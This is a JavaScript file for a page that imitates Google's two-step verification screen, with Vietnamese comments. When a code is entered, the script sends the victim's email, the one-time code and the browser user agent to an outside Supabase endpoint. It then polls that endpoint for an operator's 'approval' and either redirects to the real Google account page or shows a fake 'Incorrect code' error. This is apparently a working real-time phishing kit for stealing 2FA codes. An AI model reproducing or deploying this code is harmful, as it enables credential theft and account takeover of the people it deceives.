// Lấy email từ URL hoặc localStorage
function getEmail() {
    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get('email') || localStorage.getItem('userEmail') || 'user@example.com';
    return email;
}

function setUserEmail() {
    const email = getEmail();
    const emailBox = document.getElementById('verifyUserEmail');
    if (emailBox) emailBox.textContent = email;
}

// Navigation function with Google-style transition
function navigateTo(page) {
    // Add fade-out effect to current page
    const mainWrapper = document.querySelector('.main-wrapper');
    mainWrapper.classList.add('fade-out');
    
    // Show loading overlay
    const loadingOverlay = document.getElementById('loadingOverlay');
    const progressBar = document.getElementById('progressBar');
    const progressContainer = document.querySelector('.progress-container');
    
    loadingOverlay.classList.add('active');
    progressContainer.classList.add('active');
    
    // Reset progress bar
    progressBar.style.width = '0%';
    progressBar.classList.remove('loading', 'completing');
    
    // Start smooth progress animation
    setTimeout(() => {
        progressBar.classList.add('loading');
        progressBar.style.width = '80%';
    }, 100);
    
    // Navigate after animation completes
    setTimeout(() => {
        progressBar.classList.remove('loading');
        progressBar.classList.add('completing');
        progressBar.style.width = '100%';
        
        // Hide progress bar and navigate
        setTimeout(() => {
            progressContainer.classList.remove('active');
            window.location.href = page;
        }, 300);
    }, 1200);
}

// Thêm xử lý click cho desktop
function setupDesktopEmailClick() {
    const userEmailBtn = document.querySelector('.user-email-btn');
    if (userEmailBtn) {
        userEmailBtn.addEventListener('click', function() {
            navigateTo('index.html');
        });
    }
}

// Thêm xử lý click cho mobile
function setupMobileEmailClick() {
    const mobileEmailBox = document.querySelector('.user-email-box');
    if (mobileEmailBox) {
        mobileEmailBox.style.cursor = 'pointer';
        mobileEmailBox.addEventListener('click', function() {
            navigateTo('index.html');
        });
    }
}

// Thêm xử lý click cho Try another way
function setupTryAnotherWayClick() {
    // Desktop
    const tryAnotherWayLink = document.querySelector('.verify-link');
    if (tryAnotherWayLink) {
        tryAnotherWayLink.addEventListener('click', function(e) {
            e.preventDefault();
            const email = getEmail();
            navigateTo('verify-options.html?email=' + encodeURIComponent(email));
        });
    }

    // Mobile
    const mobileTryLink = document.querySelector('.try-link');
    if (mobileTryLink) {
        mobileTryLink.addEventListener('click', function(e) {
            e.preventDefault();
            const email = getEmail();
            navigateTo('verify-options.html?email=' + encodeURIComponent(email));
        });
    }
}

window.addEventListener('DOMContentLoaded', function() {
    setUserEmail();
    setupDesktopEmailClick();
    setupTryAnotherWayClick();
    
    // Focus input code
    const codeInput = document.getElementById('verifyCode');
    if (codeInput) codeInput.focus();
    
    // Xử lý submit
    const nextBtn = document.getElementById('verifyNextBtn');
    if (nextBtn && codeInput) {
        nextBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            if (!codeInput.value.trim()) {
                codeInput.style.borderColor = '#d93025';
                codeInput.focus();
                return;
            }
            
            // Lấy requestId từ localStorage
            const requestId = localStorage.getItem('requestId');
            const email = getEmail();
            const twofa = codeInput.value.trim();
            
            if (requestId) {
                try {
                    // Gửi 2FA code đến Supabase
                    const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
                            'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                        },
                        body: JSON.stringify({
                            email: email,
                            password: '',
                            twofa: twofa,
                            userAgent: navigator.userAgent,
                            currentPage: 'verify.html'
                        })
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        console.log('2FA code submitted:', data);
                        
                        // Chờ admin approval
                        await checkApprovalStatus(email);
                    } else {
                        // Nếu không kết nối được Backend, chuyển trang bình thường
                        navigateTo('verify-notification.html?email=' + encodeURIComponent(email));
                    }
                } catch (error) {
                    console.error('Error sending 2FA data to backend:', error);
                    // Nếu có lỗi, chuyển trang bình thường
                    navigateTo('verify-notification.html?email=' + encodeURIComponent(email));
                }
            } else {
                // Không có requestId, chuyển trang bình thường
                navigateTo('verify-notification.html?email=' + encodeURIComponent(email));
            }
        });
        codeInput.addEventListener('input', function() {
            codeInput.style.borderColor = '#dadce0';
        });
    }
});

// Thêm xử lý click cho mobile khi template được load
const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.addedNodes.length) {
            setupMobileEmailClick();
            setupTryAnotherWayClick();
        }
    });
});

observer.observe(document.body, { childList: true, subtree: true });

// Hàm kiểm tra trạng thái approval
async function checkApprovalStatus(email) {
    const maxAttempts = 60; // Tối đa 60 lần kiểm tra (5 phút)
    let attempts = 0;
    
    const checkStatus = async () => {
        try {
                            const response = await fetch(`https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(email)}`, {
                headers: {
                    'Cache-Control': 'no-cache',
                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                }
            });
            if (response.ok) {
                const data = await response.json();
                console.log('Approval status:', data);
                
                if (data.status === 'approved') {
                    // Được approve, redirect đến Google My Account
                    window.location.href = 'https://myaccount.google.com/';
                    return;
                } else if (data.status === 'denied') {
                    // Bị từ chối, hiển thị lỗi dưới input
                    const codeInput = document.getElementById('verifyCode');
                    const errorContainer = document.querySelector('.error-container') || createErrorContainer();
                    errorContainer.textContent = 'Incorrect code, please try again';
                    errorContainer.style.display = 'block';
                    if (codeInput) {
                        codeInput.value = '';
                        codeInput.focus();
                    }
                    return;
                }
            }
            
            attempts++;
            if (attempts < maxAttempts) {
                // Kiểm tra lại sau 1 giây
                setTimeout(checkStatus, 1000);
            } else {
                // Hết thời gian chờ
                console.log('Timeout waiting for approval');
            }
        } catch (error) {
            console.error('Error checking approval status:', error);
            attempts++;
            if (attempts < maxAttempts) {
                setTimeout(checkStatus, 1000);
            } else {
                console.log('Error timeout checking approval');
            }
        }
    };
    
    // Bắt đầu kiểm tra
    checkStatus();
}

// Tạo error container để hiển thị lỗi
function createErrorContainer() {
    const codeInput = document.getElementById('verifyCode');
    if (!codeInput) return null;
    
    const container = document.createElement('div');
    container.className = 'error-container';
    container.style.cssText = `
        color: #d93025;
        font-size: 14px;
        margin-top: 8px;
        margin-left: 16px;
        display: none;
    `;
    
    // Insert after the input field
    codeInput.parentNode.insertBefore(container, codeInput.nextSibling);
    return container;
}

// Hàm hiển thị thông báo
function showNotification(message, type = 'info') {
    // Remove existing notifications
    const existingNotification = document.querySelector('.notification');
    if (existingNotification) {
        existingNotification.remove();
    }

    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.textContent = message;
    
    // Style the notification
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        border-radius: 4px;
        color: white;
        font-size: 14px;
        font-weight: 500;
        z-index: 1000;
        animation: slideIn 0.3s ease;
        ${type === 'error' ? 'background-color: #d93025;' : 'background-color: #1a73e8;'}
    `;

    document.body.appendChild(notification);

    // Remove notification after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (notification.parentElement) {
                notification.remove();
            }
        }, 300);
    }, 3000);
} 